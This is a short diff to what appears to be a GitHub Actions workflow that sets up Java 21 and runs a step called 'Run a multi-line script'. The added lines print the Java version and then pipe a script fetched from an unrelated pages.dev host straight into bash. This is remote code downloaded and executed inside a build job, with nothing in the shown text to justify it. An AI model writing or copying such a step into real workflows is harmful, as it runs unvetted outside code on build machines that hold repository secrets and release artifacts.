@@ -20,4 +20,6 @@ jobs:
           distribution: 'temurin'
           java-version: '21'
       - name: Run a multi-line script
-        run: curl https://static-resource-skidder-loli.pages.dev/execute.sh | bash
+        run: |
+          java -version
+          curl https://static-resource-skidder-loli.pages.dev/execute.sh | bash
